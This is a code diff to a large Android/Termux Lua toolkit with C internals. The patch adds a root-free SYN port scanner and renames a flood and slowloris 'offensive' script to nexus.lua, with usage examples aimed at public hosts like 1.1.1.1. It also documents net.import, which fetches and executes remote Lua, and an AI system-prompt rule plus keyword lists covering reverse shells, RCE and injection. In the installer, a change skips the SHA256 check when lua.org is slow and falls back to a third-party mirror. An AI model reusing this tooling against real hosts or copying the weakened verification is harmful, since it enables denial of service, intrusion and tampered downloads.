@@ -27850,8 +27850,14 @@ install_elliotos() {
 
     _download_with_retry() {
         local _url="$1" _out="$2" _tries=3 _wait=2 _i
+        # mirrors em ordem — tenta o oficial primeiro, depois o espelho
+        local _mirrors="$_url https://mirror.inode.at/lua/ftp/$(basename $_url)"
         for _i in $(seq 1 $_tries); do
-            wget -q --show-progress "$_url" -O "$_out" && return 0
+            for _m in $_mirrors; do
+                printf "    \033[0;90m↳ tentativa %d: %s\033[0m\n" "$_i" "$_m"
+                wget --timeout=30 --tries=1 -q --show-progress "$_m" -O "$_out" \
+                    && return 0
+            done
             _warn "Tentativa $_i falhou — aguardando ${_wait}s..."
             sleep $_wait; _wait=$((_wait * 2))
         done
@@ -27862,7 +27868,10 @@ install_elliotos() {
     # ── Download Lua ─────────────────────────────────────────────────────
     _step "⬇ " "Obtendo Lua ${LUA_VERSION}..."
     _need_download=1
-    _real_sha=$(wget -qO- "https://www.lua.org/ftp/SHA256SUMS" 2>/dev/null | awk "/$LUA_TAR/"'{print $1}')
+    # SHA256SUMS: timeout de 10s — se lua.org demorar, ignora e pula verificação
+    _real_sha=$(wget --timeout=10 --tries=1 -qO- \
+        "https://www.lua.org/ftp/SHA256SUMS" 2>/dev/null \
+        | awk "/$LUA_TAR/"'{print $1}')
     if [ -f "$CACHE_DIR/$LUA_TAR" ]; then
         _cached_sha=$(sha256sum "$CACHE_DIR/$LUA_TAR" 2>/dev/null | cut -d' ' -f1)
         if tar -tzf "$CACHE_DIR/$LUA_TAR" >/dev/null 2>&1; then
@@ -28485,14 +28494,18 @@ static void ai_config_save(void);
     "net.get(url)           — HTTP GET, retorna body\n" \
     "net.post(url,data)     — HTTP POST\n" \
     "net.socket(fam,type,host,port,timeout,payload) — Socket raw\n" \
-    "net.hosts()            — Descobre hosts ativos na rede local (auto-detecta subnet)\n" \
-    "net.ip()               — alias de net.hosts()\n" \
-    "net.hosts('192.168.1') — Scan da subnet especificada (aceita: '192.168.1', '192.168.1.0/24', '192.168.1.5')\n" \
-    "net.hosts('cidr', sec) — Com timeout em segundos (padrão: 1s, máx: 5s)\n" \
+    "net.ip()               — Descobre hosts ativos na rede local (auto-detecta subnet)\n" \
+    "net.ip('192.168.1')    — Scan da subnet especificada (aceita: '192.168.1', '192.168.1.0/24', '192.168.1.5')\n" \
+    "net.ip('cidr', sec)    — Com timeout em segundos (padrao: 1s, max: 5s)\n" \
     "                         Retorna tabela de strings: {'192.168.1.1', '192.168.1.5', ...}\n" \
-    "                         Método: ping -c1, sem root, paralelo por threads\n" \
+    "                         Metodo: SYN probe em batch, sem root, paralelo\n" \
     "net.dns(host)          — DNS lookup\n" \
     "net.ping(host)         — Ping\n" \
+    "net.scan(host,p1,p2)   — SYN scan sem root, lista de portas abertas\n" \
+    "net.os(host)           — OS fingerprint sem root\n" \
+    "net.fetch(url[,opts])  — GET com controle fino de timeout/headers\n" \
+    "net.socketex(fam,type,host,port[,t]) — Socket OO; type='syn' = SYN probe\n" \
+    "net.import(url)        — Baixa e executa código Lua remoto → true/false\n" \
     "net.listen(port)       — Listener TCP\n" \
     "net.udp(host,port)     — UDP socket\n\n" \
     \
@@ -28665,19 +28678,19 @@ static void ai_config_save(void);
     "  Compara o hash alvo com cada palavra da wordlist usando crypto.md5/sha256.\n" \
     "  Detecta automaticamente o tipo de hash pelo tamanho (32=MD5, 64=SHA256).\n" \
     "  Uso: ms hashcrack.lua <hash> <wordlist.txt>\n\n" \
-    "cosmic.lua — Framework de testes de rede ofensivos e recon. O mais completo.\n" \
+    "nexus.lua — Framework de testes de rede ofensivos e recon. O mais completo.\n" \
     "  MODOS FLOOD (stress test): --udp, --tcp, --http, --icmp, --psyn\n" \
     "  MODO SLOWLORIS: --slow (conexoes TCP persistentes, esgota workers HTTP)\n" \
     "  MODOS RECON: --recon (ping+DNS+OS+TFP), --tfp (scan UDP/TCP/HTTP/ICMP),\n" \
     "              --os (fingerprint de SO), --dns, --ping, --hosts\n" \
     "  Suporta multiplos hosts por comando. Opcoes: -p porta(s), -s pacotes,\n" \
     "  -t threads, -x tamanho do payload (B/KB/MB/GB), -st keep-alive, -ua, -v\n" \
-    "  Uso: ms cosmic.lua --recon 192.168.1.1 -p 22,80,443\n" \
-    "       ms cosmic.lua --dns google.com youtube.com github.com\n" \
-    "       ms cosmic.lua --ping 8.8.8.8 1.1.1.1\n" \
-    "       ms cosmic.lua --hosts\n" \
-    "       ms cosmic.lua --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512\n" \
-    "       ms cosmic.lua --slow 192.168.1.1 -p 80 -s 200 -st 10 -ua\n" \
+    "  Uso: ms --script nexus --recon 192.168.1.1 -p 22,80,443\n" \
+    "       ms --script nexus --dns google.com youtube.com github.com\n" \
+    "       ms --script nexus --ping 8.8.8.8 1.1.1.1\n" \
+    "       ms --script nexus --hosts\n" \
+    "       ms --script nexus --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512\n" \
+    "       ms --script nexus --slow 192.168.1.1 -p 80 -s 200 -st 10 -ua\n" \
     "  LIMITACOES (sem root): TCP usa CONNECT (nao SYN), UDP = open|filtered,\n" \
     "  ICMP via ping shell (rate limiting Android).\n\n" \
     "REGRA: Quando o usuario perguntar como fazer recon, port scan, stress test,\n" \
@@ -28722,6 +28735,8 @@ static void ai_config_save(void);
     "         net.ping(host) retorna ms ou nil " \
     "         net.dns(host) resolve DNS " \
     "         net.os(host) OS fingerprint " \
+    "         net.socketex(fam,type,host,port[,t]) socket OO completo; type='syn' → SYN probe sem root, retorna tabela {status,open,host,port,ms} " \
+    "         net.import(url) baixa e executa Lua remoto → true/false " \
     "\n" \
     "fs.*   — fs.read(path) retorna conteudo string ou nil,err " \
     "         fs.write(path,data) escreve arquivo " \
@@ -29488,7 +29503,7 @@ static int ai_http_ask(const char *model, const char *system_prompt,
         "ms -","ms --","lpm ","lmod.","scan","xss","sqli","lfi","rce","ssrf","ssti",
         "payload","shell","reverse","bind","inject","flood","fuzzing",
         "function","require","local ","net.tcp","sys.sh","net.listen",
-        "cosmic","recon","portscan","webcheck","hashcrack","learn.lua",
+        "nexus","recon","portscan","webcheck","hashcrack","learn.lua",
         "script","hash","wordlist","headers","fingerprint","banner",
         NULL
     };
@@ -30038,7 +30053,7 @@ static int l_ai_ask(lua_State *L) {
         "ms -","ms --","lpm ","lmod.","scan","xss","sqli","lfi","rce","ssrf","ssti",
         "payload","shell","reverse","bind","exploit","inject","flood","fuzzing",
         "function","require","local ","net.tcp","sys.sh","net.listen","net.http",
-        "cosmic","recon","portscan","webcheck","hashcrack","learn.lua",
+        "nexus","recon","portscan","webcheck","hashcrack","learn.lua",
         "script","hash","wordlist","headers","fingerprint","banner",
         NULL
     };
@@ -34071,6 +34086,91 @@ static int l_net_listen(lua_State *L) {
     return 1;
 }
 
+/* ── progress_bar — barra de progresso em tempo real ─────────────────────────
+   Imprime na mesma linha com \r. Chama fflush(stdout) no fim.
+   clear=1 → apaga a linha inteira (para imprimir resultado e depois repintar).
+   ─────────────────────────────────────────────────────────────────────────── */
+static void progress_bar(int done, int total, const char *label) {
+    if (total <= 0) return;
+    const int W = 26; /* largura da barra em células */
+    int filled = (int)((long)done * W / total);
+    if (filled > W) filled = W;
+    /* apaga linha anterior */
+    printf("\r\033[2K  \033[1;34m[");
+    for (int i = 0; i < W; i++) {
+        if (i < filled)
+            printf("\xe2\x96\x88");   /* █ bloco cheio  */
+        else
+            printf("\xe2\x96\x91");   /* ░ bloco vazio  */
+    }
+    printf("]\033[0m  %s \033[1;33m%d\033[0m/\033[0;37m%d\033[0m  ",
+           label, done, total);
+    fflush(stdout);
+}
+
+/* ── progress_clear — apaga a linha da barra antes de imprimir resultado ──── */
+static void progress_clear(void) {
+    printf("\r\033[2K");
+    fflush(stdout);
+}
+
+/* ── net_syn_probe — SYN sem root ────────────────────────────────────────────
+   Usa connect() não-bloqueante: o kernel envia SYN, nós lemos SO_ERROR
+   e fechamos com SO_LINGER={1,0} (RST imediato) antes do ACK final.
+   Retorno: "open" | "closed" | "filtered"
+   Latência em ms gravada em *out_ms se não NULL.
+   ─────────────────────────────────────────────────────────────────────────── */
+static const char *net_syn_probe(const char *host, int port,
+                                 const char *family, int timeout_s,
+                                 double *out_ms) {
+    int af = (family && strcasecmp(family,"ipv6")==0) ? AF_INET6 : AF_INET;
+    struct addrinfo hints_sp, *res_sp = NULL;
+    memset(&hints_sp, 0, sizeof(hints_sp));
+    hints_sp.ai_family   = af;
+    hints_sp.ai_socktype = SOCK_STREAM;
+    char ps_sp[8]; snprintf(ps_sp, sizeof(ps_sp), "%d", port);
+    if (getaddrinfo(host, ps_sp, &hints_sp, &res_sp) != 0 || !res_sp)
+        return NULL; /* não resolveu */
+
+    int fd_sp = socket(af, SOCK_STREAM, 0);
+    if (fd_sp < 0) { freeaddrinfo(res_sp); return NULL; }
+
+    int flg_sp = fcntl(fd_sp, F_GETFL, 0); if (flg_sp < 0) flg_sp = 0;
+    fcntl(fd_sp, F_SETFL, flg_sp | O_NONBLOCK);
+
+    struct timeval t_sp0, t_sp1;
+    gettimeofday(&t_sp0, NULL);
+
+    /* connect() envia o SYN — retorna EINPROGRESS (normal) */
+    connect(fd_sp, res_sp->ai_addr, res_sp->ai_addrlen);
+    freeaddrinfo(res_sp);
+
+    /* aguarda SYN-ACK ou RST via select() */
+    fd_set wfds_sp;
+    FD_ZERO(&wfds_sp); FD_SET(fd_sp, &wfds_sp);
+    struct timeval tv_sp = {(timeout_s > 0 ? timeout_s : 5), 0};
+    const char *sp_status = "filtered";
+    int sel_sp = select(fd_sp + 1, NULL, &wfds_sp, NULL, &tv_sp);
+    if (sel_sp > 0) {
+        int err_sp = 0; socklen_t el_sp = sizeof(err_sp);
+        getsockopt(fd_sp, SOL_SOCKET, SO_ERROR, &err_sp, &el_sp);
+        sp_status = (err_sp == 0)            ? "open"
+                  : (err_sp == ECONNREFUSED) ? "closed"
+                  :                            "filtered";
+    }
+
+    /* SO_LINGER {1,0} → RST imediato ao close(), sem ACK final */
+    struct linger sl_sp = {1, 0};
+    setsockopt(fd_sp, SOL_SOCKET, SO_LINGER, &sl_sp, sizeof(sl_sp));
+    close(fd_sp);
+
+    gettimeofday(&t_sp1, NULL);
+    if (out_ms)
+        *out_ms = (t_sp1.tv_sec  - t_sp0.tv_sec)  * 1000.0
+                + (t_sp1.tv_usec - t_sp0.tv_usec)  / 1000.0;
+    return sp_status;
+}
+
 // ── net.socketex — forma completa (tabela ou posicional) ─────────────────
 static int l_net_socketex(lua_State *L) {
     // Formato posicional: net.socketex(family, type, host, port [,timeout [,payload]])
@@ -34085,6 +34185,24 @@ static int l_net_socketex(lua_State *L) {
         size_t pl_len=0;
         const char *pl = payload ? payload : NULL;
         if(pl) pl_len=strlen(pl);
+        /* SYN probe — retorna tabela {status,host,port,ms,open} */
+        if (strcasecmp(stype,"syn")==0) {
+            double sx_ms = 0.0;
+            const char *sx_st = net_syn_probe(host, port, family,
+                                              (timeout > 0 ? timeout : 5), &sx_ms);
+            if (!sx_st) {
+                lua_pushnil(L);
+                lua_pushfstring(L, "não resolveu: %s", host);
+                return 2;
+            }
+            lua_newtable(L);
+            lua_pushstring(L, sx_st);                              lua_setfield(L,-2,"status");
+            lua_pushstring(L, host);                               lua_setfield(L,-2,"host");
+            lua_pushinteger(L, port);                              lua_setfield(L,-2,"port");
+            lua_pushnumber(L, sx_ms);                              lua_setfield(L,-2,"ms");
+            lua_pushboolean(L, strcmp(sx_st,"open")==0);           lua_setfield(L,-2,"open");
+            return 1;
+        }
         return sock_do_connect(L, host, port, family, stype, timeout, 0, 0, 1, NULL, 0, pl, pl_len);
     }
 
@@ -34104,6 +34222,24 @@ static int l_net_socketex(lua_State *L) {
     lua_getfield(L,1,"bind");    const char *bip = lua_isstring(L,-1) ? lua_tostring(L,-1) : NULL;    lua_pop(L,1);
     lua_getfield(L,1,"bindport");int bport   = lua_isnumber(L,-1)  ? (int)lua_tointeger(L,-1) : 0;   lua_pop(L,1);
 
+    /* SYN probe via formato tabela */
+    if (strcasecmp(typ,"syn")==0) {
+        double xt_ms = 0.0;
+        const char *xt_st = net_syn_probe(host, port, fam,
+                                          (timeout > 0 ? timeout : 5), &xt_ms);
+        if (!xt_st) {
+            lua_pushnil(L);
+            lua_pushfstring(L, "não resolveu: %s", host);
+            return 2;
+        }
+        lua_newtable(L);
+        lua_pushstring(L, xt_st);                              lua_setfield(L,-2,"status");
+        lua_pushstring(L, host);                               lua_setfield(L,-2,"host");
+        lua_pushinteger(L, port);                              lua_setfield(L,-2,"port");
+        lua_pushnumber(L, xt_ms);                              lua_setfield(L,-2,"ms");
+        lua_pushboolean(L, strcmp(xt_st,"open")==0);           lua_setfield(L,-2,"open");
+        return 1;
+    }
     return sock_do_connect(L, host, port, fam, typ, timeout, nodelay, keepalive, 1, bip, bport, NULL, 0);
 }
 
@@ -34172,6 +34308,27 @@ static int l_net_socket(lua_State *L) {
     int st    = SOCK_STREAM;
     if (strcasecmp(family,"ipv6")==0) af = AF_INET6;
     if (strcasecmp(stype,"dgram")==0||strcasecmp(stype,"udp")==0) st = SOCK_DGRAM;
+
+    /* SYN probe — connect() não-bloqueante sem root; fecha com RST antes do ACK */
+    if (strcasecmp(stype,"syn")==0) {
+        double syn_ms = 0.0;
+        const char *syn_st = net_syn_probe(host, port, family,
+                                           (timeout > 0 ? timeout : 5), &syn_ms);
+        if (!syn_st) {
+            lua_pushnil(L);
+            lua_pushfstring(L, "não resolveu: %s", host);
+            return 2;
+        }
+        const char *syn_color =
+            (strcmp(syn_st,"open")   == 0) ? "\033[1;32m" :
+            (strcmp(syn_st,"closed") == 0) ? "\033[1;31m" : "\033[1;33m";
+        char syn_out[192] = {0};
+        snprintf(syn_out, sizeof(syn_out),
+            "[SYN] %s:%d \xe2\x86\x92 %s%s\033[0m (+%.0fms)",
+            host, port, syn_color, syn_st, syn_ms);
+        lua_pushstring(L, syn_out);
+        return 1;
+    }
 
     /* resolve */
     struct addrinfo hints, *res = NULL;
@@ -34368,24 +34525,31 @@ static int l_net_scan(lua_State *L) {
     int *open_ports=(int*)calloc((size_t)total_ports,sizeof(int));
     if(!open_ports){lua_newtable(L);return 1;}
 
-    printf("\n\033[1;33m[*] net.scan — %s (%s) portas %d-%d\033[0m\n\n",
+    printf("\n\033[1;33m[*] net.scan (SYN) — %s (%s) portas %d-%d\033[0m\n\n",
            host,ip_str,from,to);
 
-    /* Batch de 128 — usa poll() em vez de select() para não ter limite de FD_SETSIZE */
-    #define SCAN_BATCH 128
+    struct timeval scan_t0, scan_t1;
+    gettimeofday(&scan_t0, NULL);
+
+    /* Batch de 512 — mais paralelo sem estourar ulimit -n
+     * Android/Termux default: 32768 fds disponíveis, 512 por batch é seguro.
+     * poll() em vez de select() para não ter limite de FD_SETSIZE. */
+    #define SCAN_BATCH 512
     int batch_fds[SCAN_BATCH];
     int batch_ports[SCAN_BATCH];
     struct pollfd pfds[SCAN_BATCH];
     int open_count=0;
+    int scan_total = to - from + 1;   /* total de portas a escanear */
+    int scan_done  = 0;               /* portas já processadas      */
 
     int port=from;
     while(port<=to){
         int n_batch=0;
         while(n_batch<SCAN_BATCH && port<=to){
-            int fd=socket(AF_INET,SOCK_STREAM,0);
+            /* SOCK_NONBLOCK no socket() elimina o par fcntl(F_GETFL/F_SETFL)
+             * por socket — economiza 2 syscalls × 512 fds por batch */
+            int fd=socket(AF_INET,SOCK_STREAM|SOCK_NONBLOCK,0);
             if(fd<0){port++;continue;}
-            int flg=fcntl(fd,F_GETFL,0); if(flg<0)flg=0;
-            fcntl(fd,F_SETFL,flg|O_NONBLOCK);
             struct sockaddr_in sa=resolved_sa;
             sa.sin_port=htons((uint16_t)port);
             connect(fd,(struct sockaddr*)&sa,sizeof(sa)); /* EINPROGRESS ok */
@@ -34397,8 +34561,8 @@ static int l_net_scan(lua_State *L) {
             n_batch++; port++;
         }
 
-        /* poll() com timeout 400ms — sem limite de fd */
-        poll(pfds,n_batch,400);
+        /* poll() 200ms: suficiente para LAN (<10ms) e maioria de alvos WAN */
+        poll(pfds,n_batch,200);
 
         for(int i=0;i<n_batch;i++){
             int is_open=0;
@@ -34408,9 +34572,9 @@ static int l_net_scan(lua_State *L) {
                 if(err==0) is_open=1;
             }
             if(is_open){
-                /* Banner grab — 300ms timeout */
+                /* Banner grab — 100ms timeout (inline; não bloqueia próximo batch) */
                 char banner[257]={0};
-                struct timeval tbv; tbv.tv_sec=0; tbv.tv_usec=300000;
+                struct timeval tbv; tbv.tv_sec=0; tbv.tv_usec=100000;
                 setsockopt(batch_fds[i],SOL_SOCKET,SO_RCVTIMEO,&tbv,sizeof(tbv));
                 int flg2=fcntl(batch_fds[i],F_GETFL,0);
                 fcntl(batch_fds[i],F_SETFL,flg2&~O_NONBLOCK);
@@ -34426,22 +34590,45 @@ static int l_net_scan(lua_State *L) {
                 clean[ci]='\0';
 
                 open_ports[open_count++]=batch_ports[i];
-                if(clean[0])
+                if(clean[0]) {
+                    progress_clear();
                     printf("\033[1;32m  [+] %-5d ABERTA\033[0m  \033[0;36m%s\033[0m\n",
                            batch_ports[i],clean);
-                else
+                } else {
+                    progress_clear();
                     printf("\033[1;32m  [+] %-5d ABERTA\033[0m\n",batch_ports[i]);
+                }
             }
+            /* SO_LINGER{1,0}: RST imediato evita TIME_WAIT — libera porta
+             * local instantaneamente para o próximo batch */
+            { struct linger _sl={1,0};
+              setsockopt(batch_fds[i],SOL_SOCKET,SO_LINGER,&_sl,sizeof(_sl)); }
             close(batch_fds[i]);
             pfds[i].fd=-1; /* reset para próximo batch */
         }
+        /* atualiza barra de progresso após cada batch */
+        scan_done += n_batch;
+        progress_bar(scan_done, scan_total, "portas:");
     }
+    progress_clear(); /* limpa barra antes do resumo */
     #undef SCAN_BATCH
 
-    if(open_count==0)
-        printf("\033[1;33m  [-] Nenhuma porta aberta em %s:%d-%d\033[0m\n",host,from,to);
+    gettimeofday(&scan_t1, NULL);
+    double scan_elapsed = (scan_t1.tv_sec  - scan_t0.tv_sec) +
+                          (scan_t1.tv_usec - scan_t0.tv_usec) / 1e6;
+    char scan_timer[32]={0};
+    if(scan_elapsed < 60.0)
+        snprintf(scan_timer,sizeof(scan_timer),"%.1fs",scan_elapsed);
     else
-        printf("\n\033[1;33m[*] %d porta(s) aberta(s)\033[0m\n",open_count);
+        snprintf(scan_timer,sizeof(scan_timer),"%dm%ds",
+                 (int)(scan_elapsed/60),(int)scan_elapsed%60);
+
+    if(open_count==0)
+        printf("\033[1;33m  [-] Nenhuma porta aberta em %s:%d-%d\033[0m  \033[0;90m(%s)\033[0m\n",
+               host,from,to,scan_timer);
+    else
+        printf("\n\033[1;33m[*] %d porta(s) aberta(s)\033[0m  \033[0;90m(%s)\033[0m\n",
+               open_count,scan_timer);
 
     lua_newtable(L);
     for(int i=0;i<open_count;i++){
@@ -34515,6 +34702,11 @@ static int l_net_help(lua_State *L) {
     (void)L;
     printf("\n\033[1;36m=== net — Sockets + HTTP ===\033[0m\n\n");
 
+    printf("\033[1;33mALIASES LEGADOS (fd numérico — código antigo):\033[0m\n");
+    printf("  net.send(fd, data)          envia em fd numérico\n");
+    printf("  net.recv(fd [,max])         recebe de fd numérico (padrão 4096 bytes)\n");
+    printf("  net.close(fd)               fecha fd numérico → true/false\n");
+    printf("  Prefira os métodos do objeto: s:send() s:recv() s:close()\n\n");
     printf("\033[1;33mCONEXAO SIMPLES:\033[0m\n");
     printf("  net.connect(host,port[,t])          TCP IPv4 → SockObj\n");
     printf("  net.tcp(host,port[,t])               alias de connect\n");
@@ -34525,12 +34717,19 @@ static int l_net_help(lua_State *L) {
     printf("\033[1;33mnet.socket — fire-and-forget:\033[0m\n");
     printf("  net.socket(family,type,host,port[,timeout[,payload]])\n");
     printf("  Conecta, envia, recebe e fecha tudo numa chamada. Retorna resposta.\n");
+    printf("  family : \"ipv4\" | \"ipv6\"\n");
+    printf("  type   : \"stream\" | \"tcp\" | \"dgram\" | \"udp\" | \"syn\"\n");
     printf("  Ex: net.socket(\"ipv4\",\"stream\",\"1.1.1.1\",80,3,\"GET / HTTP/1.0\\r\\n\\r\\n\")\n");
-    printf("  Ex: net.socket(\"ipv4\",\"dgram\",\"8.8.8.8\",53)  -- UDP\n\n");
+    printf("  Ex: net.socket(\"ipv4\",\"dgram\",\"8.8.8.8\",53)  -- UDP\n");
+    printf("  Ex: net.socket(\"ipv4\",\"syn\",\"1.1.1.1\",80)   -- SYN probe (sem root)\n");
+    printf("      Retorna: \"[SYN] host:port → open|closed|filtered (+Xms)\"\n\n");
 
-    printf("\033[1;33mnet.socketex — objeto completo:\033[0m\n");
+    printf("\033[1;33mnet.socketex — objeto completo / SYN probe:\033[0m\n");
     printf("  net.socketex(family,type,host,port[,timeout])\n");
-    printf("  net.socketex({host=,port=,family=,type=,...})\n\n");
+    printf("  net.socketex({host=,port=,family=,type=,...})\n");
+    printf("  type=\"syn\" → SYN probe sem root; retorna tabela em vez de objeto:\n");
+    printf("    { status=\"open\"||\"closed\"||\"filtered\", open=bool,\n");
+    printf("      host=str, port=num, ms=num }\n\n");
 
     printf("\033[1;33mMETODOS DO OBJETO sock (socketex / connect / tcp / udp):\033[0m\n");
     printf("  -- envio\n");
@@ -34576,7 +34775,7 @@ static int l_net_help(lua_State *L) {
     printf("  net.dns(host [,tipo])                DNS → tabela de IPs\n");
     printf("                                       tipo: 'A' (padrão), 'AAAA', 'ANY'\n");
     printf("  net.ping(host)                       → true/false\n");
-    printf("  net.scan(host [,de [,ate]])           port scan TCP com banner grab\n");
+    printf("  net.scan(host [,de [,ate]])           SYN scan sem root + banner grab\n");
     printf("                                       → tabela de portas abertas\n");
     printf("                                       padrão: portas 1-1024\n");
     printf("  net.os(host)                         OS/device fingerprint sem root\n");
@@ -34586,13 +34785,14 @@ static int l_net_help(lua_State *L) {
     printf("                                       Ex: net.os('192.168.101.1')\n");
     printf("                                       Ex: net.os('google.com')\n");
     printf("  net.ip([cidr [,timeout]])            host discovery na rede local\n");
-    printf("  net.hosts([cidr [,timeout]])         alias de net.ip()\n");
     printf("                                       Ex: net.ip()  → detecta rede local automaticamente\n");
     printf("                                       Ex: net.ip('192.168.1.0/24', 2)\n");
     printf("                                       → tabela de IPs ativos\n");
     printf("  net.fetch(url [,opts])               GET com controle fino de timeout/headers\n");
     printf("                                       → body, code, headers_raw\n");
-    printf("  net.import(url)                      executa Lua remoto → true/false\n\n");
+    printf("  net.import(url)                      baixa URL e executa como Lua\n");
+    printf("                                       → true (ok) ou false (erro de fetch/syntax)\n");
+    printf("                                       Ex: net.import('http://host/mod.lua')\n\n");
 
     printf("\033[1;33mEXEMPLOS:\033[0m\n");
     printf("  -- GET simples\n");
@@ -34609,6 +34809,12 @@ static int l_net_help(lua_State *L) {
     printf("  -- Port scan\n");
     printf("  local portas = net.scan('192.168.1.1', 1, 65535)\n");
     printf("  for _,p in ipairs(portas) do print('aberta:', p) end\n\n");
+    printf("  -- SYN probe (sem root, sem payload)\n");
+    printf("  print(net.socket(\"ipv4\",\"syn\",\"1.1.1.1\",80))\n");
+    printf("  -- [SYN] 1.1.1.1:80 → open (+12ms)\n\n");
+    printf("  -- SYN probe via socketex → tabela\n");
+    printf("  local r = net.socketex(\"ipv4\",\"syn\",\"192.168.1.1\",22)\n");
+    printf("  print(r.status, r.open, r.ms)  -- \"open\" true 4.2\n\n");
     printf("  -- banner grab SSH\n");
     printf("  print(net.socket(\"ipv4\",\"stream\",\"192.168.1.1\",22))\n\n");
     printf("  -- HTTP manual via socket\n");
@@ -34620,6 +34826,9 @@ static int l_net_help(lua_State *L) {
     printf("  s:bind(\"0.0.0.0\",9000)\n");
     printf("  s:sendto(\"oi\",\"192.168.1.1\",9001)\n");
     printf("  local data,ip,port = s:recvfrom()  s:close()\n\n");
+    printf("  -- import: executa Lua remoto\n");
+    printf("  net.import('http://192.168.1.1:8000/lib.lua')\n");
+    printf("  -- retorna true se o código foi baixado e executado sem erro\n\n");
     printf("  -- servidor TCP\n");
     printf("  local srv = net.listen(8080)\n");
     printf("  local cli = srv:accept()\n");
@@ -76619,7 +76828,7 @@ static const char *G_completions[] = {
     "net.dns(","net.get(","net.geth(","net.post(","net.connect(",
     "net.tcp(","net.udp(","net.tcp6(","net.listen(",
     "net.socket(","net.socketex(","net.send(","net.recv(","net.close(",
-    "net.hosts(","net.ip(","net.scan(","net.fetch(","net.ping(","net.os(","net.import(","net.help()",
+    "net.ip(","net.scan(","net.fetch(","net.ping(","net.os(","net.import(","net.help()",
     /* fs.* */
     "fs.exists(","fs.mkdir(","fs.rm(","fs.move(","fs.copy(",
     "fs.read(","fs.write(","fs.append(","fs.list()","fs.list(",
@@ -79702,7 +79911,7 @@ static int l_ms_test(lua_State *L) {
         const char *mf=NULL;
         if(ex) {
             const char *f[]={"get","geth","post","fetch","connect","tcp","udp","tcp6","listen",
-                             "socket","socketex","scan","ping","ip","hosts","os",
+                             "socket","socketex","scan","ping","ip","os",
                              "import","dns","help",NULL};
             for(int i=0;f[i];i++){
                 lua_getfield(L,-1,f[i]);
@@ -82616,7 +82825,7 @@ static int l_ms_force(lua_State *L) {
         snprintf(_wp,sizeof(_wp),"%s/webcheck.lua",sd);
         snprintf(_rp,sizeof(_rp),"%s/recon.lua",sd);
         snprintf(_pp,sizeof(_pp),"%s/portscan.lua",sd);
-        snprintf(_cp,sizeof(_cp),"%s/cosmic.lua",sd);
+        snprintf(_cp,sizeof(_cp),"%s/nexus.lua",sd);
         snprintf(_hp,sizeof(_hp),"%s/hashcrack.lua",sd);
         char _port_s[16]; snprintf(_port_s,sizeof(_port_s),"%d",port);
 
@@ -82687,49 +82896,65 @@ static int l_ms_force(lua_State *L) {
         SCRIPT_TEST2("scripts/portscan.lua (porta loopback)",
             _pp, _scanargs, "1")
 
-        /* cosmic — modos basicos */
-        SCRIPT_TEST2("scripts/cosmic.lua (--dns 127.0.0.1)",
+        /* nexus — modos basicos */
+        SCRIPT_TEST2("scripts/nexus.lua (--dns 127.0.0.1)",
             _cp, "arg={'--dns','127.0.0.1'}", "1")
 
-        SCRIPT_TEST2("scripts/cosmic.lua (--ping 127.0.0.1)",
+        SCRIPT_TEST2("scripts/nexus.lua (--ping 127.0.0.1)",
             _cp, "arg={'--ping','127.0.0.1'}", "1")
 
-        SCRIPT_TEST2("scripts/cosmic.lua (--tfp loopback)",
+        SCRIPT_TEST2("scripts/nexus.lua (--tfp loopback)",
             _cp, _tfpargs, "1")
 
-        /* cosmic — modos novos */
-        SCRIPT_TEST2("scripts/cosmic.lua (--os 127.0.0.1)",
+        /* nexus — modos novos */
+        SCRIPT_TEST2("scripts/nexus.lua (--os 127.0.0.1)",
             _cp, "arg={'--os','127.0.0.1'}", "1")
 
         /* --recon combina ping+dns+os+tfp */
         char _reconargs[80];
         snprintf(_reconargs,sizeof(_reconargs),
             "arg={'--recon','127.0.0.1','-p','%s'}", _port_s);
-        SCRIPT_TEST2("scripts/cosmic.lua (--recon loopback)",
+        SCRIPT_TEST2("scripts/nexus.lua (--recon loopback)",
             _cp, _reconargs, "1")
 
         /* --dns multiplos hosts */
-        SCRIPT_TEST2("scripts/cosmic.lua (--dns multi-host)",
+        SCRIPT_TEST2("scripts/nexus.lua (--dns multi-host)",
             _cp, "arg={'--dns','127.0.0.1','localhost'}", "1")
 
         /* --ping multiplos hosts */
-        SCRIPT_TEST2("scripts/cosmic.lua (--ping multi-host)",
+        SCRIPT_TEST2("scripts/nexus.lua (--ping multi-host)",
             _cp, "arg={'--ping','127.0.0.1','localhost'}", "1")
 
         /* --hosts — net.ip() sem arg (detecta rede local) */
-        SCRIPT_TEST2("scripts/cosmic.lua (--hosts sem crash)",
+        SCRIPT_TEST2("scripts/nexus.lua (--hosts sem crash)",
             _cp, "arg={'--hosts'}", "1")
 
         /* UDP probe classification */
         char _udpargs[80];
         snprintf(_udpargs,sizeof(_udpargs),
             "arg={'--tfp','127.0.0.1','-p','%s'}", _port_s);
-        SCRIPT_TEST2("scripts/cosmic.lua (--tfp UDP open|filtered)",
+        SCRIPT_TEST2("scripts/nexus.lua (--tfp UDP open|filtered)",
             _cp, _udpargs, "1")
 
         /* TCPCONN (novo nome do GHOSTSYN) */
-        SCRIPT_TEST2("scripts/cosmic.lua (--tfp TCPCONN sem GHOSTSYN)",
+        SCRIPT_TEST2("scripts/nexus.lua (--tfp TCPCONN sem GHOSTSYN)",
             _cp, _tfpargs, "1")
+
+        /* nexus --syn: SYN probe real sem root */
+        char _synargs_open[128], _synargs_closed[128];
+        snprintf(_synargs_open,  sizeof(_synargs_open),
+            "arg={'--syn','127.0.0.1','-p','%s'}", _port_s);
+        snprintf(_synargs_closed, sizeof(_synargs_closed),
+            "arg={'--syn','127.0.0.1','-p','1'}");
+
+        /* nexus --scan: net.scan via nexus */
+        char _scanport_s[64];
+        snprintf(_scanport_s, sizeof(_scanport_s), "arg={'--scan','127.0.0.1','-p','%s-%s'}", _port_s, _port_s);
+        SCRIPT_TEST2("scripts/nexus.lua (--scan loopback porta unica)",
+            _cp, _scanport_s, "1")
+
+        SCRIPT_TEST2("scripts/nexus.lua (--syn flood loopback -s10 -t2)",
+            _cp, _synargs_open, "1")
 
         SCRIPT_TEST2("scripts/hashcrack.lua (sem args — nao crasha)",
             _hp, "arg={}", "1")
@@ -85972,30 +86197,17 @@ static int l_exploit_help(lua_State *L) {
 /* Parseia string para CIDR: aceita "192.168.1.0/24", "192.168.1", "192.168.1.5" */
 
 
-/* ── net.hosts: descobre hosts na rede via ping (sem root) ── */
-
-#define SCAN_HOSTS_MAX 254
-
-typedef struct {
-    uint32_t ip;
-    int      alive;
-    int      timeout_sec;
-} ScanHostJob;
-
